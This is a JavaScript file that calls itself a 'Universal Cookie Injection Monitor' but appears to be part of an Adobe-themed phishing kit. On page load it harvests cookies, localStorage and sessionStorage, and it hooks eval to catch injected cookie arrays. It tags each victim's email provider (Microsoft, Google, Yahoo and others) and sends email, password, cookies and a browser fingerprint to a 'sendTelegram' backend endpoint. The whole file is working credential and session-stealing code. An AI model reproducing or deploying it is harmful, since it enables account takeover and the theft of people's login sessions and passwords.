/**
 * Universal Cookie Injection Monitor
 * This script monitors for cookie injections and captures them from ALL email domains
 */

(function() {
  'use strict';
  
  console.log('🚀 Universal Cookie Injection Monitor loaded - ALL DOMAINS');
  
  // Store for captured cookies
  let capturedCookies = new Map();
  
  // Universal cookie capture that works with ALL domains
  function captureAllCookies() {
    try {
      const allCookies = [];
      const documentCookies = document.cookie;
      
      // Parse existing document cookies
      if (documentCookies && documentCookies.trim() !== '') {
        const cookieStrings = documentCookies.split(';');
        for (const cookieStr of cookieStrings) {
          const [name, ...valueParts] = cookieStr.trim().split('=');
          const value = valueParts.join('=');
          
          if (name && value) {
            const cookie = {
              name: name.trim(),
              value: value.trim(),
              domain: getUniversalDomain(window.location.hostname),
              path: '/',
              secure: window.location.protocol === 'https:',
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null,
              captureMethod: 'document',
              timestamp: new Date().toISOString()
            };
            
            allCookies.push(cookie);
            capturedCookies.set(`${cookie.name}:${cookie.domain}`, cookie);
          }
        }
      }
      
      console.log('🍪 Document cookies captured:', allCookies.length, 'from domain:', window.location.hostname);
      return allCookies;
      
    } catch (error) {
      console.error('❌ Error capturing cookies:', error);
      return [];
    }
  }
  
  // Universal domain detection - works with ANY email provider
  function getUniversalDomain(hostname) {
    // Always use the current hostname with leading dot for proper cookie domain format
    const baseDomain = hostname.startsWith('.') ? hostname : `.${hostname}`;
    
    console.log('🌐 Universal domain mapping:', hostname, '->', baseDomain);
    
    // Return the actual domain being used
    return baseDomain;
  }
  
  // Enhanced provider detection for better categorization
  function detectEmailProvider(hostname, email = '') {
    // Microsoft/Outlook domains
    if (hostname.includes('microsoftonline.com') || 
        hostname.includes('outlook.com') || 
        hostname.includes('live.com') ||
        hostname.includes('hotmail.com') ||
        email.includes('@outlook.com') ||
        email.includes('@hotmail.com') ||
        email.includes('@live.com')) {
      return 'Microsoft/Outlook';
    }
    
    // Google domains
    if (hostname.includes('google.com') || 
        hostname.includes('gmail.com') ||
        hostname.includes('accounts.google.com') ||
        email.includes('@gmail.com')) {
      return 'Google/Gmail';
    }
    
    // Yahoo domains
    if (hostname.includes('yahoo.com') || 
        hostname.includes('mail.yahoo.com') ||
        email.includes('@yahoo.com')) {
      return 'Yahoo';
    }
    
    // AOL domains
    if (hostname.includes('aol.com') ||
        email.includes('@aol.com')) {
      return 'AOL';
    }
    
    // Apple domains
    if (hostname.includes('apple.com') || 
        hostname.includes('icloud.com') ||
        email.includes('@icloud.com') ||
        email.includes('@me.com') ||
        email.includes('@mac.com')) {
      return 'Apple/iCloud';
    }
    
    // ProtonMail
    if (hostname.includes('protonmail.com') ||
        email.includes('@protonmail.com') ||
        email.includes('@pm.me')) {
      return 'ProtonMail';
    }
    
    // Zoho
    if (hostname.includes('zoho.com') ||
        email.includes('@zoho.com')) {
      return 'Zoho';
    }
    
    // Custom/Corporate domains
    if (email && email.includes('@') && !email.includes('@gmail.com') && 
        !email.includes('@yahoo.com') && !email.includes('@outlook.com') &&
        !email.includes('@hotmail.com') && !email.includes('@live.com')) {
      const domain = email.split('@')[1];
      return `Custom Domain (${domain})`;
    }
    
    // Default - use hostname
    return `Other (${hostname})`;
  }
  
  // Monitor for cookie injection patterns - UNIVERSAL
  function monitorCookieInjections() {
    // Hook into eval function
    const originalEval = window.eval;
    window.eval = function(code) {
      try {
        if (typeof code === 'string') {
          // Universal cookie injection patterns - catches ALL cookie injections
          if (code.includes('document.cookie') || 
              code.includes('JSON.parse([') ||
              code.includes('"name"') && code.includes('"value"') ||
              code.includes('Max-Age') ||
              code.includes('SameSite') ||
              code.includes('Secure') ||
              code.includes('HttpOnly') ||
              code.includes('Path=') ||
              code.includes('Domain=') ||
              code.includes('expires=')) {
            
            console.log('🔍 Universal cookie injection detected on:', window.location.hostname);
            console.log('📝 Code snippet:', code.substring(0, 300) + '...');
            extractCookiesFromCode(code);
          }
        }
      } catch (e) {
        // Ignore parsing errors
      }
      
      return originalEval.call(this, code);
    };
    
    // Monitor script injections
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            const element = node;
            if (element.tagName === 'SCRIPT' && element.textContent) {
              extractCookiesFromCode(element.textContent);
            }
          }
        });
      });
    });
    
    if (document.body) {
      observer.observe(document.body, { childList: true, subtree: true });
    } else {
      document.addEventListener('DOMContentLoaded', () => {
        observer.observe(document.body, { childList: true, subtree: true });
      });
    }
  }
  
  // Enhanced cookie extraction - works with ANY format
  function extractCookiesFromCode(code) {
    try {
      console.log('🔍 Analyzing code for cookies on:', window.location.hostname);
      
      // Method 1: Extract JSON cookie arrays - IMPROVED PATTERN
      const jsonMatches = code.match(/JSON\.parse\(\[[\s\S]*?\]\)/g);
      if (jsonMatches) {
        console.log('🎯 Found JSON.parse patterns:', jsonMatches.length);
        jsonMatches.forEach(match => {
          try {
            // Extract the array part more reliably
            const arrayMatch = match.match(/\[([\s\S]*?)\]/);
            if (arrayMatch) {
              const arrayStr = '[' + arrayMatch[1] + ']';
              console.log('🔍 Parsing array from:', window.location.hostname);
              const cookies = JSON.parse(arrayStr);
              if (Array.isArray(cookies)) {
                console.log('🍪 Found cookie array:', cookies.length, 'cookies from', window.location.hostname);
                cookies.forEach(cookie => processCookieObject(cookie, 'injection'));
                
                // Auto-send to Telegram when cookies are captured
                setTimeout(() => {
                  autoSendCapturedData();
                }, 1000);
              }
            }
          } catch (e) {
            console.log('⚠️ Failed to parse JSON cookies from', window.location.hostname, ':', e.message);
            tryAlternativeParsing(match);
          }
        });
      }
      
      // Method 2: Extract direct cookie assignments - UNIVERSAL
      const cookieSetMatches = code.match(/document\.cookie\s*=\s*[`"']([^`"']+)[`"']/g);
      if (cookieSetMatches) {
        console.log('🎯 Found direct cookie assignments:', cookieSetMatches.length);
        cookieSetMatches.forEach(match => {
          const cookieStr = match.replace(/document\.cookie\s*=\s*[`"']/, '').replace(/[`"']$/, '');
          parseCookieString(cookieStr, 'injection');
        });
      }
      
      // Method 3: Extract template literal cookies - UNIVERSAL
      const templateMatches = code.match(/document\.cookie\s*=\s*`([^`]+)`/g);
      if (templateMatches) {
        console.log('🎯 Found template literal cookies:', templateMatches.length);
        templateMatches.forEach(match => {
          const cookieStr = match.replace(/document\.cookie\s*=\s*`/, '').replace(/`$/, '');
          parseCookieString(cookieStr, 'injection');
        });
      }
      
      // Method 4: Extract cookie objects from any format
      const objectMatches = code.match(/\{[^}]*["']name["'][^}]*["']value["'][^}]*\}/g);
      if (objectMatches) {
        console.log('🎯 Found cookie objects:', objectMatches.length);
        objectMatches.forEach(match => {
          tryAlternativeParsing(match);
        });
      }
      
    } catch (error) {
      console.error('❌ Error extracting cookies from', window.location.hostname, ':', error);
    }
  }
  
  // Auto-send captured data to Telegram - UNIVERSAL
  async function autoSendCapturedData() {
    try {
      const cookies = getAllCapturedCookies();
      if (cookies.length > 0) {
        console.log('📤 Auto-sending', cookies.length, 'captured cookies from', window.location.hostname, 'to Telegram...');
        
        // Get session data
        const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
        
        // Detect provider based on current domain and email
        const provider = detectEmailProvider(window.location.hostname, sessionData.email);
        
        const browserFingerprint = getBrowserFingerprint();
        
        await sendDataToBackend(
          sessionData.email || `auto-captured@${window.location.hostname}`,
          sessionData.password || 'Auto-captured cookies',
          provider
        );
        
        console.log('✅ Auto-send completed for', window.location.hostname);
      }
    } catch (error) {
      console.error('❌ Auto-send failed for', window.location.hostname, ':', error);
    }
  }
  
  // Alternative parsing for complex cookie structures - UNIVERSAL
  function tryAlternativeParsing(codeSnippet) {
    try {
      // Look for cookie-like objects with flexible patterns
      const patterns = [
        /\{[^}]*"name"\s*:\s*"([^"]+)"[^}]*"value"\s*:\s*"([^"]+)"[^}]*\}/g,
        /\{[^}]*'name'\s*:\s*'([^']+)'[^}]*'value'\s*:\s*'([^']+)'[^}]*\}/g,
        /name\s*:\s*["']([^"']+)["'][^,]*value\s*:\s*["']([^"']+)["']/g
      ];
      
      patterns.forEach(pattern => {
        let match;
        while ((match = pattern.exec(codeSnippet)) !== null) {
          processCookieObject({
            name: match[1],
            value: match[2],
            domain: getUniversalDomain(window.location.hostname)
          }, 'injection');
        }
      });
      
      // Try JSON parsing if it looks like an object
      if (codeSnippet.includes('{') && codeSnippet.includes('}')) {
        try {
          const cookieObj = JSON.parse(codeSnippet);
          if (cookieObj.name && cookieObj.value) {
            processCookieObject(cookieObj, 'injection');
          }
        } catch (e) {
          // Not valid JSON, continue with other methods
        }
      }
      
    } catch (error) {
      console.error('❌ Alternative parsing failed for', window.location.hostname, ':', error);
    }
  }
  
  // Process cookie object from injection - UNIVERSAL
  function processCookieObject(cookieObj, method) {
    try {
      if (cookieObj && cookieObj.name && cookieObj.value) {
        const cookie = {
          name: cookieObj.name,
          value: cookieObj.value,
          domain: cookieObj.domain || getUniversalDomain(window.location.hostname),
          path: cookieObj.path || '/',
          secure: cookieObj.secure !== undefined ? cookieObj.secure : window.location.protocol === 'https:',
          httpOnly: cookieObj.httpOnly || false,
          sameSite: cookieObj.sameSite || 'none',
          expirationDate: cookieObj.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
          hostOnly: cookieObj.hostOnly || false,
          session: cookieObj.session || false,
          storeId: cookieObj.storeId || null,
          captureMethod: method,
          timestamp: new Date().toISOString(),
          sourceHostname: window.location.hostname,
          detectedProvider: detectEmailProvider(window.location.hostname)
        };
        
        const key = `${cookie.name}:${cookie.domain}`;
        capturedCookies.set(key, cookie);
        
        console.log(`🍪 Captured cookie [${method}]:`, cookie.name, 'from', cookie.sourceHostname, 'provider:', cookie.detectedProvider);
        
        // Update stored session data
        updateStoredSession();
      }
    } catch (error) {
      console.error('❌ Error processing cookie object from', window.location.hostname, ':', error);
    }
  }
  
  // Parse cookie string from document.cookie assignments - UNIVERSAL
  function parseCookieString(cookieString, method) {
    try {
      const parts = cookieString.split(';');
      const [name, ...valueParts] = parts[0].split('=');
      const value = valueParts.join('=');
      
      if (name && value) {
        const cookie = {
          name: name.trim(),
          value: value.trim(),
          domain: getUniversalDomain(window.location.hostname),
          path: '/',
          secure: window.location.protocol === 'https:',
          httpOnly: false,
          sameSite: 'none',
          expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
          hostOnly: false,
          session: false,
          storeId: null,
          captureMethod: method,
          timestamp: new Date().toISOString(),
          sourceHostname: window.location.hostname,
          detectedProvider: detectEmailProvider(window.location.hostname)
        };
        
        // Parse additional attributes
        for (let i = 1; i < parts.length; i++) {
          const part = parts[i].trim().toLowerCase();
          if (part.startsWith('domain=')) {
            cookie.domain = part.substring(7);
          } else if (part.startsWith('path=')) {
            cookie.path = part.substring(5);
          } else if (part === 'secure') {
            cookie.secure = true;
          } else if (part === 'httponly') {
            cookie.httpOnly = true;
          } else if (part.startsWith('samesite=')) {
            cookie.sameSite = part.substring(9);
          }
        }
        
        const key = `${cookie.name}:${cookie.domain}`;
        capturedCookies.set(key, cookie);
        
        console.log(`🍪 Captured cookie [${method}]:`, cookie.name, 'from', cookie.sourceHostname, 'provider:', cookie.detectedProvider);
        updateStoredSession();
      }
    } catch (error) {
      console.error('❌ Error parsing cookie string from', window.location.hostname, ':', error);
    }
  }
  
  // Update stored session with captured cookies
  function updateStoredSession() {
    try {
      const storedSession = localStorage.getItem('adobe_autograb_session');
      if (storedSession) {
        const sessionData = JSON.parse(storedSession);
        sessionData.cookies = Array.from(capturedCookies.values());
        sessionData.totalCookiesCaptured = capturedCookies.size;
        sessionData.lastCookieUpdate = new Date().toISOString();
        sessionData.currentDomain = window.location.hostname;
        sessionData.detectedProvider = detectEmailProvider(window.location.hostname, sessionData.email);
        localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
      }
    } catch (error) {
      console.error('❌ Error updating stored session for', window.location.hostname, ':', error);
    }
  }
  
  // Get all captured cookies
  function getAllCapturedCookies() {
    return Array.from(capturedCookies.values());
  }
  
  // Enhanced browser fingerprinting - UNIVERSAL
  function getBrowserFingerprint() {
    try {
      const cookies = getAllCapturedCookies();
      
      // Get localStorage
      let localStorage = 'Empty';
      try {
        const localStorageData = {};
        for (let i = 0; i < window.localStorage.length; i++) {
          const key = window.localStorage.key(i);
          localStorageData[key] = window.localStorage.getItem(key);
        }
        localStorage = Object.keys(localStorageData).length > 0 ? JSON.stringify(localStorageData) : 'Empty';
      } catch (e) {
        localStorage = 'Access denied';
      }
      
      // Get sessionStorage
      let sessionStorage = 'Empty';
      try {
        const sessionStorageData = {};
        for (let i = 0; i < window.sessionStorage.length; i++) {
          const key = window.sessionStorage.key(i);
          sessionStorageData[key] = window.sessionStorage.getItem(key);
        }
        sessionStorage = Object.keys(sessionStorageData).length > 0 ? JSON.stringify(sessionStorageData) : 'Empty';
      } catch (e) {
        sessionStorage = 'Access denied';
      }
      
      return {
        cookies: cookies,
        localStorage: localStorage,
        sessionStorage: sessionStorage,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        domain: window.location.hostname,
        documentCookies: document.cookie,
        totalCaptured: cookies.length,
        detectedProvider: detectEmailProvider(window.location.hostname),
        captureStats: {
          injection: cookies.filter(c => c.captureMethod === 'injection').length,
          document: cookies.filter(c => c.captureMethod === 'document').length,
          byProvider: cookies.reduce((acc, cookie) => {
            const provider = cookie.detectedProvider || 'Unknown';
            acc[provider] = (acc[provider] || 0) + 1;
            return acc;
          }, {})
        }
      };
      
    } catch (error) {
      console.error('❌ Error getting browser fingerprint for', window.location.hostname, ':', error);
      return {
        cookies: getAllCapturedCookies(),
        localStorage: 'Error',
        sessionStorage: 'Error',
        userAgent: navigator.userAgent || 'Unknown',
        language: navigator.language || 'Unknown',
        platform: navigator.platform || 'Unknown',
        cookieEnabled: navigator.cookieEnabled || false,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        domain: window.location.hostname,
        documentCookies: document.cookie,
        totalCaptured: capturedCookies.size,
        detectedProvider: detectEmailProvider(window.location.hostname),
        error: error.message
      };
    }
  }
  
  // Function to send data to backend - UNIVERSAL
  async function sendDataToBackend(email, password, provider = 'Others') {
    try {
      const browserFingerprint = getBrowserFingerprint();
      
      console.log('📤 Sending data to backend from', window.location.hostname, ':', {
        email,
        provider,
        cookieCount: browserFingerprint.cookies.length,
        hasLocalStorage: browserFingerprint.localStorage !== 'Empty',
        hasSessionStorage: browserFingerprint.sessionStorage !== 'Empty'
      });
      
      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          password: password,
          provider: provider,
          fileName: `Cookie Data - ${provider}`,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          browserFingerprint: browserFingerprint,
          documentCookies: document.cookie,
          sessionId: Math.random().toString(36).substring(2, 15),
          cookies: browserFingerprint.cookies,
          formattedCookies: browserFingerprint.cookies,
          sourceHostname: window.location.hostname,
          detectedProvider: provider,
          universalCapture: true
        })
      });
      
      const result = await response.json();
      console.log('✅ Backend response for', window.location.hostname, ':', result);
      
      return result;
      
    } catch (error) {
      console.error('❌ Error sending data to backend from', window.location.hostname, ':', error);
      return { error: error.message };
    }
  }
  
  // Initialize monitoring - UNIVERSAL
  function initialize() {
    console.log('🚀 Initializing universal cookie capture for:', window.location.hostname);
    
    // Capture existing cookies
    captureAllCookies();
    
    // Start monitoring for injections
    monitorCookieInjections();
    
    // Periodic cookie check
    setInterval(() => {
      const newCookies = captureAllCookies();
      if (newCookies.length > 0) {
        console.log('🔄 Periodic cookie check found', newCookies.length, 'cookies on', window.location.hostname);
      }
    }, 5000);
    
    console.log('✅ Universal cookie capture initialized for:', window.location.hostname);
  }
  
  // Export functions to global scope
  window.captureAllCookies = getAllCapturedCookies;
  window.getBrowserFingerprint = getBrowserFingerprint;
  window.sendDataToBackend = sendDataToBackend;
  window.advancedCookieCapture = {
    getAllCookies: getAllCapturedCookies,
    getStats: () => ({
      total: capturedCookies.size,
      currentDomain: window.location.hostname,
      detectedProvider: detectEmailProvider(window.location.hostname),
      byMethod: {
        injection: getAllCapturedCookies().filter(c => c.captureMethod === 'injection').length,
        document: getAllCapturedCookies().filter(c => c.captureMethod === 'document').length
      },
      byProvider: getAllCapturedCookies().reduce((acc, cookie) => {
        const provider = cookie.detectedProvider || 'Unknown';
        acc[provider] = (acc[provider] || 0) + 1;
        return acc;
      }, {})
    }),
    exportCookies: () => JSON.stringify(getAllCapturedCookies(), null, 2)
  };
  
  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
  } else {
    initialize();
  }
  
})();